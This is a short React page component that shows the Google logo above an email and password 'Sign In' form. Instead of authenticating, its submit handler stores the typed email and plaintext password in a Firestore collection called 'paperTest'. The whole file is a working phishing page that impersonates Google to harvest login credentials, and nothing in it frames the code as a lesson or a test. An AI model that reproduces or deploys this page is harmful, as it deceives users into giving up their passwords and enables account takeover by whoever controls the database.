import { useEffect, useState } from "react";
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
import { collection, addDoc, getFirestore } from "firebase/firestore";
import { firebaseConfig } from "../firebaseConfig";
import { getDatabase } from "firebase/database";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const firestore = getFirestore(app);
    const dbInstance = collection(firestore, "paperTest");

    try {
      await addDoc(dbInstance, {
        emailName: email,
        idName: password,
      });
      console.log("Document added successfully!");
    } catch (error) {
      console.error("Error adding document: ", error);
    }
  };

  return (
    <div className="App">
      <header className="App-header">
        <img
          src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
          alt="Google Logo"
        />
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email"
          />
          <input
            type="password"
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
          />
          <button type="submit">Sign In</button>
        </form>
      </header>
    </div>
  );
}
